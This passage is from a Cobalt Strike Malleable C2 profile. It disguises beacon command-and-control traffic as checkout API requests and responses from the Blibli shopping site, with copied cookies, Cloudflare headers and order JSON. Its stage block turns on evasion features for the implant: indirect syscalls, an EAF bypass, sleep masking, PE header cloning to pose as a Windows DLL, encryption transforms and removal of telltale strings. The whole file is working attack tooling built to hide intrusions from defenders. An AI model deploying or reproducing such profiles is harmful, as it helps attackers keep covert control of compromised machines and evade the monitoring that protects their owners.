##    POST is used to send output to the teamserver
##    Can use HTTP GET or POST to send data
##    Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel.
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Decide if you want to use HTTP GET or HTTP POST requests for this section
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
## Use HTTP POST for http-post section
## Uncomment this Section to activate
# FOR POST METHOD
#http-post {

#     set uri "/backend/retail/product/bag1x195fa /backend/retail/checkouts/bag1x195fa/_validate-shipping /backend/retail/checkouts/bag1x195fa/promo /backend/retail/checkouts/bag1x195fa/insurance /backend/retail/checkouts/bag1x195fa/payment /backend/retail/checkouts/bag1x195fa/_validate-payment";  
#     set verb "POST";
#     # set verb "GET";

#     client {
#         header "Content-Type" "application/json";
#         header "Accept-Encoding" "gzip, deflate";
#         header "Accept" "*/*";
#         id {
#             mask;
#             mask;
#             base64url;
#             prepend "_gcl_au=1.1.499311798.1737183477; Device-Id=U.eec57b6d-1b9f-410f-987a; Device-Id-Signature=3638e9e0f9bb4ea59f6fa82c50524b10187c17cd; _ga=GA1.2.1268647298.1737183478; _vis_opt_s=2%7C; _vwo_ssm=1; afUserId=bd23330f-a0ac-467f-p; _hjSessionUser_866675=";
#             header "Cookie";            
#         }
#         output {
#             mask;
#             mask;
#             base64url;
#             prepend "{\"item_id\": \"1737183478.a16f57be-96f6-4f4f-a82d-03027a69d26e\",\"session_id\":\"";
# 	        append "\"}";
#             print;
#         }
#    }

#     server {

         #Set-Cookie: cf_clearance=9WFi6UMUv9_m9wx5WkWhFpnN2wQNbgT.j7dpaqvbzdY-1739974870-1.2.1.1-XnfpxWBpoqjauVZME_DjLRJCqWLg6XHYaMpcY3gDCfbwOB6qWESBCEI2tXiNLDpbt4hf27NOr08ARCMDueAG0Y9_eIZMVS2dRxtTGA7Y9HKQ5vwbW08HjpDDX_RtwjV4hhGFqo_3DmJXLy7jyDFMGTvpwivs8W3sjXoFxoU6ENvu5EHSRB2EotezSlhqG8jl6sOcP4wtHlFLUmxOmsOC5cfji_MhXMTlRXdDdgS3CfPVKJxiDp115xg._GynwdBvfmvbX5_nHcw0TPXU97pM4QBFyWA0cERZ8lM_VkpYpPQ; Path=/; Priority=High; HttpOnly; Secure; SameSite=None; Partitioned
#         header "Cf-Ray" "9146e6da1a130ec4-HKG";
#         header "Server" "cloudflare";
#         header "Content-Type" "application/json";
#         header "vary" "Accept-Encoding";
#         header "cache-control" "max-age=0";
#         header "content-encoding" "gzip";
#         header "content-security-policy" "frame-ancestors 'self'";
#         header "strict-transport-security" "max-age=15724800; includeSubDomains";
#         header "cf-cache-status" "DYNAMIC";
#         header "expect-ct" "max-age=86400, enforce";
#         header "referrer-policy" "same-origin";
#         header "x-content-type-options" "nosniff";
#         header "x-frame-options" "SAMEORIGIN";
#         header "x-xss-protection" "1; mode=block";
#         header "X-Firefox-Spdy" "h2";
#         output {
#             mask;
#             mask;
#             base64url;
#             prepend "{\"metaData\":{\"deliveryGroups\":[{\"id\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"sequence\":1,\"type\":\"REGULAR\",\"status\":{\"code\":\"OK\"},\"subGroups\":[],\"deliverySubGroups\":[{\"id\":\"REGULAR\",\"type\":\"REGULAR\",\"status\":{\"code\":\"OK\"},\"products\":[{\"id\":\"REGULAR##\",\"type\":\"REGULAR\",\"skus\":[\"BLI-60052-00206-00001#MAR-0000000001#false#PP-3538527###INSR-PLAN-00224##REGULAR#REGULAR\"],\"timestamp\":1741966733595}],\"timestamp\":1741966733595}],\"tags\":[\"SHIPPING_INSURANCE\",\"LATEST_SHIPPING_COST_CHANGE\",\"HIGHLIGHT_ORIGINAL\",\"FULFILLED_BY_BLIBLI\",\"SHIPPING_BEST_PRICE\"],\"pickupPointCode\":\"PP-3538527\",\"businessHours\":[],\"shipping\":{\"name\":\"Standard\",\"value\":\"STANDARD\",\"cost\":{\"original\":31500,\"insurance\":1500,\"packaging\":0,\"offered\":0},\"etdMin\":1,\"etdMax\":4,\"etdType\":\"DAYS\",\"etdMessage\":\"\",\"status\":{\"code\":\"OK\"},\"customCost\":0,\"fulfillmentTypes\":[\"DELIVERY\"],\"selectedFulfillmentType\":\"DELIVERY\",\"highlightedLogisticsOption\":{\"name\":\"Same day\",\"value\":\"SAME_DAY\",\"etdMin\":8,\"etdMax\":12,\"etdType\":\"HOURS\",\"additionalCost\":12500}},\"merchantCode\":\"Blibli\",\"merchantDocumentSkus\":[]}],\"combos\":[]},\"code\":200,\"status\":\"OK\",\"data\":{\"id\":\"67c7a7371d5b297fd75642f1\",\"cartType\":\"REGULAR\",\"stockReleaseTime\":1741967635000,\"items\":[{\"id\":\"BLI-60052-00206-00001#MAR-0000000001#false#PP-3538527###INSR-PLAN-00224##REGULAR#REGULAR\",\"itemKeyId\":\"ef293575-59bb-4984-abb9-64a47393aaf5\",\"sku\":\"BLI-60052-00206-00001\",\"productCode\":\"MTA-178809463\",\"productSku\":\"BLI-60052-00206\",\"price\":{\"discounted\":0,\"offered\":114700,\"discountPercentage\":0},\"quantity\":1,\"remainingStock\":48,\"weight\":2.448,\"loyaltyPoint\":115,\"productType\":1,\"attributes\":[],\"shipping\":{\"name\":\"Standard\",\"value\":\"STANDARD\",\"cost\":{\"original\":31500,\"insurance\":1500,\"packaging\":0,\"offered\":0},\"etdMin\":1,\"etdMax\":4,\"etdType\":\"DAYS\",\"etdMessage\":\"\",\"status\":{\"code\":\"OK\"},\"customCost\":0},\"tags\":[\"DISABLE_NOTES_TO_SELLER\",\"ENABLE_WISHLIST\",\"HIGHLIGHT_ORIGINAL\",\"FULFILLED_BY_BLIBLI\",\"PRIMARY\",\"SHIPPING_BEST_PRICE\",\"SHIPPING_INSURANCE\",\"LATEST_SHIPPING_COST_CHANGE\"],\"identifier\":[],\"actions\":[],\"shippingGroup\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"tradeIn\":{},\"addOns\":[],\"insurances\":[{\"code\":\"INSR-PLAN-00224\",\"selected\":true,\"markAsDefault\":true,\"products\":[{\"code\":\"INSR-TIER-00840\",\"price\":4700,\"selected\":true,\"markAsDefault\":true}]}],\"totalInstallation\":0,\"totalInsurance\":4700,\"documentsRequired\":[],\"preOrder\":false,\"fulfillmentTypes\":[\"DELIVERY\"],\"wholesaleRule\":[],\"promoInfo\":{\"endDate\":1742144340000,\"remainingTime\":177603554,\"type\":\"REGULAR\"},\"groupId\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"status\":{\"code\":\"OK\"}}],\"customer\":{\"phoneNumberVerified\":true,\"loginEmailVerified\":true},\"payment\":{\"amount\":120400,\"fee\":0},\"tags\":[\"MPP_WAREHOUSE_ENABLED\",\"TIVO_MIGRATION_ENABLED\",\"SINGLE_PAYMENT_PAGE_ENABLED\",\"SPECIFIC_ERROR_CODE\",\"GET_AIFA_SUGGESTION\",\"TREE_DONATION\",\"UPDATE_QUANTITY_ON_CHECKOUT_PAGE\",\"GOLD_SAVINGS\",\"ENABLE_MULTI_PICKUP_POINT\",\"STOCK_RESERVATION_IN_PAY_NOW\",\"QUICK_CHECKOUT\"],\"highlightedLogisticsOptions\":{\"e773e34b2cc3db7847f2ce8c75bc5f99\":{\"name\":\"Same day\",\"value\":\"SAME_DAY\",\"etdMin\":8,\"etdMax\":12,\"etdType\":\"HOURS\"}},\"totalOrder\":114700,\"totalAddOn\":4700,\"totalInstallation\":0,\"totalInsurance\":4700,\"totalShippingCost\":31500,\"totalShippingWithoutCustomsCost\":31500,\"totalInternationalCustomCost\":0,\"totalShippingAdjustment\":-31500,\"totalOrderAdjustment\":0,\"totalLoyaltyPoint\":115,\"totalBonusPoint\":0,\"totalCashback\":0,\"totalTradeInAdjustment\":0,\"totalAddOnAdjustment\":0,\"totalVoucherAdjustment\":31500,\"voucherAdjustmentType\":\"AMOUNT_OFF\",\"status\":{\"code\":\"OK\",\"params\":{}},\"version\":\"56024987-29ce-481d-8bac-5536b1751d3b\",\"vouchers\":[{\"code\":\"Intracity\",\"group\":\"SHIPPING\",\"section\":\"SHIPPING\",\"rewardValue\":31500,\"rewardType\":\"AMOUNT_OFF\",\"tags\":[\"NEWLY_AUTO_APPLIED\",\"AUTO_APPLY\"],\"remainingTime\":0,\"timestamp\":1741966736199,\"status\":\"\"}],\"voucherMeta\":{\"sections\":[{\"code\":\"SHIPPING\",\"title\":\"Gratis Ongkir\",\"limit\":0,\"tags\":[]}]},\"failedVouchers\":[],\"failedInsurances\":[],\"insuredProductQty\":1,\"needPromoIndicator\":true,\"merchantDocuments\":[],\"point\":{\"total\":196916,\"redeem\":{\"active\":false,\"available\":98458,\"value\":98458},\"status\":{}},\"totalLoyaltyPointAdjustment\":0,\"payments\":[{\"method\":\"GCXCreditCard\",\"name\":\"1889 **** **** **04 \",\"CCIdentifier\":\"";
#             append "\",\"remainingAmount\":0,\"tags\":[\"TNC\"]}],\"orderSummary\":{\"product\":{\"itemCount\":1,\"amount\":114700,\"tags\":[\"DETAIL\"]},\"shipping\":{\"itemCount\":0,\"amount\":0,\"originalAmount\":31500,\"tags\":[\"DETAIL\"]},\"insurance\":{\"itemCount\":0,\"amount\":4700,\"tags\":[\"DETAIL\"]},\"payment-fee\":{\"itemCount\":0,\"amount\":0,\"tags\":[\"DETAIL\"]},\"platform-fee\":{\"itemCount\":0,\"amount\":1000,\"tags\":[\"DETAIL\"]},\"total\":{\"itemCount\":0,\"amount\":120400},\"point\":{\"itemCount\":0,\"amount\":115,\"tags\":[\"REWARD\"]}},\"voucherIndicator\":{\"total\":31500,\"type\":\"AMOUNT_OFF\"}}}";
#             print;
#         }
#     }
# }
# FOR GET METHOD
 http-post {

    set uri "/backend/retail/product/bag1x195fa /backend/retail/checkouts/bag1x195fa/_validate-shipping /backend/retail/checkouts/bag1x195fa/promo /backend/retail/checkouts/bag1x195fa/insurance /backend/retail/checkouts/bag1x195fa/payment /backend/retail/checkouts/bag1x195fa/_validate-payment";  
    set verb "GET";
    set client_max_post_get_size "4096";
    set client_max_post_get_packet "65535";
    client {
        header "Content-Type" "application/json";
        header "Accept-Encoding" "gzip, deflate";
        id {
            mask;
            mask;
            base64url;
            prepend "_gcl_au=1.1.499311798.1737183477; Device-Id=U.eec57b6d-1b9f-410f-987a; Device-Id-Signature=3638e9e0f9bb4ea59f6fa82c50524b10187c17cd; _ga=GA1.2.1268647298.1737183478; _vis_opt_s=2%7C; _vwo_ssm=1; afUserId=bd23330f-a0ac-467f-p; _hjSessionUser_866675=";
            header "Cookie";            
        }
        output {
            mask;
            mask;
            base64url;
            header "Cf-Chl";
        }
   }

    server {

        #Set-Cookie: cf_clearance=9WFi6UMUv9_m9wx5WkWhFpnN2wQNbgT.j7dpaqvbzdY-1739974870-1.2.1.1-XnfpxWBpoqjauVZME_DjLRJCqWLg6XHYaMpcY3gDCfbwOB6qWESBCEI2tXiNLDpbt4hf27NOr08ARCMDueAG0Y9_eIZMVS2dRxtTGA7Y9HKQ5vwbW08HjpDDX_RtwjV4hhGFqo_3DmJXLy7jyDFMGTvpwivs8W3sjXoFxoU6ENvu5EHSRB2EotezSlhqG8jl6sOcP4wtHlFLUmxOmsOC5cfji_MhXMTlRXdDdgS3CfPVKJxiDp115xg._GynwdBvfmvbX5_nHcw0TPXU97pM4QBFyWA0cERZ8lM_VkpYpPQ; Path=/; Priority=High; HttpOnly; Secure; SameSite=None; Partitioned
        header "Cf-Ray" "9146e6da1a130ec4-HKG";
        header "Server" "cloudflare";
        header "Content-Type" "application/json";
        header "vary" "Accept-Encoding";
        header "cache-control" "max-age=0";
        header "content-encoding" "gzip";
        header "content-security-policy" "frame-ancestors 'self'";
        header "strict-transport-security" "max-age=15724800; includeSubDomains";
        header "cf-cache-status" "DYNAMIC";
        header "expect-ct" "max-age=86400, enforce";
        header "referrer-policy" "same-origin";
        header "x-content-type-options" "nosniff";
        header "x-frame-options" "SAMEORIGIN";
        header "x-xss-protection" "1; mode=block";
        header "X-Firefox-Spdy" "h2";
        output {
            mask;
            mask;
            base64url;
            prepend "{\"metaData\":{\"deliveryGroups\":[{\"id\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"sequence\":1,\"type\":\"REGULAR\",\"status\":{\"code\":\"OK\"},\"subGroups\":[],\"deliverySubGroups\":[{\"id\":\"REGULAR\",\"type\":\"REGULAR\",\"status\":{\"code\":\"OK\"},\"products\":[{\"id\":\"REGULAR##\",\"type\":\"REGULAR\",\"skus\":[\"BLI-60052-00206-00001#MAR-0000000001#false#PP-3538527###INSR-PLAN-00224##REGULAR#REGULAR\"],\"timestamp\":1741966733595}],\"timestamp\":1741966733595}],\"tags\":[\"SHIPPING_INSURANCE\",\"LATEST_SHIPPING_COST_CHANGE\",\"HIGHLIGHT_ORIGINAL\",\"FULFILLED_BY_BLIBLI\",\"SHIPPING_BEST_PRICE\"],\"pickupPointCode\":\"PP-3538527\",\"businessHours\":[],\"shipping\":{\"name\":\"Standard\",\"value\":\"STANDARD\",\"cost\":{\"original\":31500,\"insurance\":1500,\"packaging\":0,\"offered\":0},\"etdMin\":1,\"etdMax\":4,\"etdType\":\"DAYS\",\"etdMessage\":\"\",\"status\":{\"code\":\"OK\"},\"customCost\":0,\"fulfillmentTypes\":[\"DELIVERY\"],\"selectedFulfillmentType\":\"DELIVERY\",\"highlightedLogisticsOption\":{\"name\":\"Same day\",\"value\":\"SAME_DAY\",\"etdMin\":8,\"etdMax\":12,\"etdType\":\"HOURS\",\"additionalCost\":12500}},\"merchantCode\":\"Blibli\",\"merchantDocumentSkus\":[]}],\"combos\":[]},\"code\":200,\"status\":\"OK\",\"data\":{\"id\":\"67c7a7371d5b297fd75642f1\",\"cartType\":\"REGULAR\",\"stockReleaseTime\":1741967635000,\"items\":[{\"id\":\"BLI-60052-00206-00001#MAR-0000000001#false#PP-3538527###INSR-PLAN-00224##REGULAR#REGULAR\",\"itemKeyId\":\"ef293575-59bb-4984-abb9-64a47393aaf5\",\"sku\":\"BLI-60052-00206-00001\",\"productCode\":\"MTA-178809463\",\"productSku\":\"BLI-60052-00206\",\"price\":{\"discounted\":0,\"offered\":114700,\"discountPercentage\":0},\"quantity\":1,\"remainingStock\":48,\"weight\":2.448,\"loyaltyPoint\":115,\"productType\":1,\"attributes\":[],\"shipping\":{\"name\":\"Standard\",\"value\":\"STANDARD\",\"cost\":{\"original\":31500,\"insurance\":1500,\"packaging\":0,\"offered\":0},\"etdMin\":1,\"etdMax\":4,\"etdType\":\"DAYS\",\"etdMessage\":\"\",\"status\":{\"code\":\"OK\"},\"customCost\":0},\"tags\":[\"DISABLE_NOTES_TO_SELLER\",\"ENABLE_WISHLIST\",\"HIGHLIGHT_ORIGINAL\",\"FULFILLED_BY_BLIBLI\",\"PRIMARY\",\"SHIPPING_BEST_PRICE\",\"SHIPPING_INSURANCE\",\"LATEST_SHIPPING_COST_CHANGE\"],\"identifier\":[],\"actions\":[],\"shippingGroup\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"tradeIn\":{},\"addOns\":[],\"insurances\":[{\"code\":\"INSR-PLAN-00224\",\"selected\":true,\"markAsDefault\":true,\"products\":[{\"code\":\"INSR-TIER-00840\",\"price\":4700,\"selected\":true,\"markAsDefault\":true}]}],\"totalInstallation\":0,\"totalInsurance\":4700,\"documentsRequired\":[],\"preOrder\":false,\"fulfillmentTypes\":[\"DELIVERY\"],\"wholesaleRule\":[],\"promoInfo\":{\"endDate\":1742144340000,\"remainingTime\":177603554,\"type\":\"REGULAR\"},\"groupId\":\"e773e34b2cc3db7847f2ce8c75bc5f99\",\"status\":{\"code\":\"OK\"}}],\"customer\":{\"phoneNumberVerified\":true,\"loginEmailVerified\":true},\"payment\":{\"amount\":120400,\"fee\":0},\"tags\":[\"MPP_WAREHOUSE_ENABLED\",\"TIVO_MIGRATION_ENABLED\",\"SINGLE_PAYMENT_PAGE_ENABLED\",\"SPECIFIC_ERROR_CODE\",\"GET_AIFA_SUGGESTION\",\"TREE_DONATION\",\"UPDATE_QUANTITY_ON_CHECKOUT_PAGE\",\"GOLD_SAVINGS\",\"ENABLE_MULTI_PICKUP_POINT\",\"STOCK_RESERVATION_IN_PAY_NOW\",\"QUICK_CHECKOUT\"],\"highlightedLogisticsOptions\":{\"e773e34b2cc3db7847f2ce8c75bc5f99\":{\"name\":\"Same day\",\"value\":\"SAME_DAY\",\"etdMin\":8,\"etdMax\":12,\"etdType\":\"HOURS\"}},\"totalOrder\":114700,\"totalAddOn\":4700,\"totalInstallation\":0,\"totalInsurance\":4700,\"totalShippingCost\":31500,\"totalShippingWithoutCustomsCost\":31500,\"totalInternationalCustomCost\":0,\"totalShippingAdjustment\":-31500,\"totalOrderAdjustment\":0,\"totalLoyaltyPoint\":115,\"totalBonusPoint\":0,\"totalCashback\":0,\"totalTradeInAdjustment\":0,\"totalAddOnAdjustment\":0,\"totalVoucherAdjustment\":31500,\"voucherAdjustmentType\":\"AMOUNT_OFF\",\"status\":{\"code\":\"OK\",\"params\":{}},\"version\":\"56024987-29ce-481d-8bac-5536b1751d3b\",\"vouchers\":[{\"code\":\"Intracity\",\"group\":\"SHIPPING\",\"section\":\"SHIPPING\",\"rewardValue\":31500,\"rewardType\":\"AMOUNT_OFF\",\"tags\":[\"NEWLY_AUTO_APPLIED\",\"AUTO_APPLY\"],\"remainingTime\":0,\"timestamp\":1741966736199,\"status\":\"\"}],\"voucherMeta\":{\"sections\":[{\"code\":\"SHIPPING\",\"title\":\"Gratis Ongkir\",\"limit\":0,\"tags\":[]}]},\"failedVouchers\":[],\"failedInsurances\":[],\"insuredProductQty\":1,\"needPromoIndicator\":true,\"merchantDocuments\":[],\"point\":{\"total\":196916,\"redeem\":{\"active\":false,\"available\":98458,\"value\":98458},\"status\":{}},\"totalLoyaltyPointAdjustment\":0,\"payments\":[{\"method\":\"GCXCreditCard\",\"name\":\"1889 **** **** **04 \",\"CCIdentifier\":\"";
            append "\",\"remainingAmount\":0,\"tags\":[\"TNC\"]}],\"orderSummary\":{\"product\":{\"itemCount\":1,\"amount\":114700,\"tags\":[\"DETAIL\"]},\"shipping\":{\"itemCount\":0,\"amount\":0,\"originalAmount\":31500,\"tags\":[\"DETAIL\"]},\"insurance\":{\"itemCount\":0,\"amount\":4700,\"tags\":[\"DETAIL\"]},\"payment-fee\":{\"itemCount\":0,\"amount\":0,\"tags\":[\"DETAIL\"]},\"platform-fee\":{\"itemCount\":0,\"amount\":1000,\"tags\":[\"DETAIL\"]},\"total\":{\"itemCount\":0,\"amount\":120400},\"point\":{\"itemCount\":0,\"amount\":115,\"tags\":[\"REWARD\"]}},\"voucherIndicator\":{\"total\":31500,\"type\":\"AMOUNT_OFF\"}}}";
            print;
        }
    }
 }

stage {
    set allocator         "MapViewOfFile";
    set cleanup           "true";
    set rdll_loader       "PrependLoader"; #PrependLoader enable the use of eaf_bypass and rdll_use_syscalls
    set rdll_use_syscalls "true";
    set eaf_bypass        "true";
    set compile_time "14 Jul 2009 08:14:00";
    set cleanup           "true";
    set data_store_size   "32";
    set sleep_mask        "true";
    set syscall_method    "indirect";
    set copy_pe_header    "true";          # Optional
    #set smartinject       "true";         # bypass EMET: pass key function pointers to its post-exploitation tools, when they're known (Disabled when PrependLoader is used)
    beacon_gate {
        All;
    }
    
    # OPSEC Note: Use the magic_header python script to generate values (https://github.com/WKL-Sec/Malleable-CS-Profiles/magic_mz.py)
    # For more details about the values, please refer to the official documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_pe-memory-indicators.htm
    set magic_mz_x86 "RZME";
    set magic_mz_x64 "QW";
    
    set magic_pe        "DM";     # Set to random values to avoid signature detections (limited to 2 characters)
    set userwx 	        "false";
    set sleep_mask	    "true";
    set stomppe	        "true";   # Otherwise easy detection
    set obfuscate	    "true";
    
    ### Module Stomping configuration ###
    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";
    #set stomppe    "true";        # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
    
    ### PE Header Clone Config - making the reflective DLL look like a specific DLL in memory ###
    ### Use dll_parse.py from WKL to parse the values from a DLL
    set name "ActivationManager.dll";
    set checksum "714538";
    set compile_time "18 Apr 2048 10:28:24";
    set entry_point "128240";
    set image_size_x64 "716800";
    set image_size_x86 "716800";
    set rich_header "\xb3\x03\xdf\x61\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xf7\x62\xb1\x32\xfe\x1a\x22\x32\x50\x62\xb1\x32\x92\x04\xb5\x33\xef\x62\xb1\x32\x92\x04\xb2\x33\xf4\x62\xb1\x32\x92\x04\xb4\x33\xeb\x62\xb1\x32\xf7\x62\xb0\x32\x10\x67\xb1\x32\x92\x04\xb0\x33\xff\x62\xb1\x32\x92\x04\xb1\x33\xf6\x62\xb1\x32\x92\x04\xbf\x33\xa5\x62\xb1\x32\x92\x04\x4c\x32\xf6\x62\xb1\x32\x92\x04\x4e\x32\xf6\x62\xb1\x32\x92\x04\xb3\x33\xf6\x62\xb1\x32";
    
    ### Beacon export obfuscation routing ###
    ### Change to your liking, as long as RC4 "128" is present. ###
    transform-obfuscate {
        lznt1;      # LZNT1 compression
        rc4 "128";  # RC4 encryption - Key length parameter: 8-2048
        xor "64";   # xor encryption - Key length parameter: 8-2048
        #base64;     # encodes using base64 encoding
    }
    
    ### String removal config ###
    # The following configuration will remove the presence of the strings from the exported beacon
    transform-x86 {
        strrep "%c%c%c%c%c%c%c%c%cMSSE-%d-server" "";
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
        
    transform-x64 {
        strrep "Argument domain error (DOMAIN)" "";
        strrep "Argument singularity (SIGN)" "";
        strrep "Overflow range error (OVERFLOW)" "";
        strrep "Partial loss of significance (PLOSS)" "";
        strrep "Total loss of significance (TLOSS)" "";
        strrep "The result is too small to be represented (UNDERFLOW)" "";
        strrep "Unknown error" "";
        strrep "_matherr(): %s in %s(%g, %g)" "";
        strrep "(retval=%g)" "";
        strrep "Mingw-w64 runtime failure:" "";
        strrep "Address %p has no image-section" "";
        strrep "VirtualQuery failed for %d bytes at address %p" "";
        strrep "VirtualProtect failed with code 0x%x" "";
        strrep "Unknown pseudo relocation protocol version %d." "";
        strrep "Unknown pseudo relocation bit size %d." "";
    }
}
